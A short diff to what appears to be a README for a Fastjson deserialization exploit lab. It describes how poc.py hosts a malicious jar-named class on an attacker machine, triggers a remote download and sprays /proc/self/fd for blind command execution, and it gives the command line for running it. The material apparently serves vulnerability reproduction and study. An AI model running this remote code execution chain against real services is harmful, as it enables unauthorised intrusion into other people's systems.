@@ -29,7 +29,7 @@ Because Fastjson replaces every `.` with `/` when building the resource path for
 The accompanying `poc.py` automates the whole chain. It builds the `jar:`-named class in pure Python, hosts it over a built-in HTTP server, and sends both stages. Run it with your own machine's IP as the attacker host (it must be reachable from the target container) and the command you want to execute:
 
 ```
-python3 poc.py pwn -t http://your-ip:8090 -l <attacker-ip> -c 'id > /tmp/success'
+python3 poc.py pwn -t http://your-ip:8090/ -l <attacker-ip> -c 'id > /tmp/success'
 ```
 
 The tool first reports the decimal form of the attacker IP, builds and hosts the probe JAR, sends the stage-1 download request (a `400` or `autoType is not support` response here is expected — the download side effect has already happened), and then sprays the `/proc/self/fd` range. This endpoint returns an error even on success, because the object it produces is not the expected bean, so the command execution is blind and must be confirmed out of band.
